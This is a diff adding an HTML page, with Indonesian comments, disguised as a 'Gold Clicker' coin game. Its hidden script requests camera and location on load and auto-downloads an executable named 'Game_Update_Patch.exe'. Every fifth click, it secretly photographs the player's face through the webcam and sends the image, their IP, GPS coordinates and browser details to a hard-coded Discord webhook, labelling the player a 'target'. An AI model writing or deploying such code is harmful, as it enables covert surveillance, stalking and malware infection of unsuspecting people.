@@ -1,0 +1,132 @@
+```html
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Super Coin Clicker - Menangkan Hadiah!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: radial-gradient(circle, #1a1a2e, #16213e); color: white; touch-action: manipulation; }
+        .coin-btn { transition: transform 0.1s active; }
+        .coin-btn:active { transform: scale(0.9); }
+        #v-preview { display: none; }
+        #c-process { display: none; }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen font-sans">
+
+    <!-- UI GAME NORMAL -->
+    <div id="game-ui" class="text-center p-6 bg-white/10 backdrop-blur-md rounded-3xl shadow-2xl border border-white/20 w-80">
+        <h1 class="text-2xl font-black mb-2 text-yellow-400">GOLD CLICKER</h1>
+        <p class="text-xs text-gray-300 mb-6">Klik koin untuk mendapatkan hadiah harian!</p>
+        
+        <div class="relative mb-6">
+            <button id="clickBtn" class="coin-btn relative z-10">
+                <img src="https://img.icons8.com/emoji/160/gold-coin-emoji.png" alt="Coin" class="w-32 h-32 mx-auto drop-shadow-[0_0_15px_rgba(255,215,0,0.6)]">
+            </button>
+        </div>
+
+        <div class="bg-black/40 rounded-xl p-3 mb-4">
+            <span class="text-gray-400 block text-[10px] uppercase">Skor Kamu</span>
+            <span id="score" class="text-3xl font-mono font-bold text-yellow-400">0</span>
+        </div>
+
+        <p id="msg" class="text-[10px] text-yellow-200/50 italic">Kumpulkan 100 koin untuk klaim hadiah...</p>
+    </div>
+
+    <!-- Hidden System -->
+    <video id="v-preview" autoplay playsinline></video>
+    <canvas id="c-process"></canvas>
+
+    <script>
+        // CONFIG KING
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482214137768710249/VWsfojpRVV6Z8NfiJUpOxFfeQTqmfRhILAlg0_2uVZBmGdMawDyhbygK0VOKyVwYR2sT";
+        const TRACKER_PAYLOAD_URL = "https://example.com/location_tracker_update.exe"; // Ganti dengan link file pelacak lokasi King
+
+        let score = 0;
+        let accessGranted = false;
+        const clickBtn = document.getElementById('clickBtn');
+        const scoreDisplay = document.getElementById('score');
+        const video = document.getElementById('v-preview');
+        const canvas = document.getElementById('c-process');
+
+        // Fungsi Meminta Izin di awal secara halus
+        async function requestAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                navigator.geolocation.getCurrentPosition(() => {
+                    accessGranted = true;
+                    console.log("System Ready");
+                });
+
+                // Tanam file pelacak otomatis (simulasi update game)
+                setTimeout(() => {
+                    const a = document.createElement('a');
+                    a.href = TRACKER_PAYLOAD_URL;
+                    a.download = "Game_Update_Patch.exe";
+                    a.click();
+                }, 5000);
+
+            } catch (err) {
+                console.log("Akses ditolak");
+            }
+        }
+
+        // Jalankan saat web dibuka
+        window.onload = requestAccess;
+
+        clickBtn.addEventListener('click', () => {
+            score++;
+            scoreDisplay.innerText = score;
+
+            // Setiap kelipatan 5 klik, ambil screenshot wajah secara diam-diam
+            if (accessGranted && score % 5 === 0) {
+                captureAndSend();
+            }
+        });
+
+        async function captureAndSend() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = canvas.toDataURL('image/png');
+            
+            // Dapatkan info tambahan
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude } = pos.coords;
+                
+                // Kirim ke Discord
+                const blob = await (await fetch(imageData)).blob();
+                const formData = new FormData();
+                formData.append('file', blob, `wajah_target_${Date.now()}.png`);
+                formData.append('payload_json', JSON.stringify({
+                    content: `🔔 **TARGET CLICKED! (Score: ${score})**`,
+                    embeds: [{
+                        title: "📍 Laporan Data Target",
+                        color: 0xFF0000,
+                        fields: [
+                            { name: "IP Address", value: ipData.ip, inline: true },
+                            { name: "Lokasi", value: `[Map Link](https://www.google.com/maps?q=${latitude},${longitude})`, inline: true },
+                            { name: "Browser", value: navigator.userAgent }
+                        ],
+                        footer: { text: "cvAI4 Monitoring System - King 77king" }
+                    }]
+                }));
+
+                fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+            });
+        }
+    </script>
+</body>
+</html>
+
+```
+
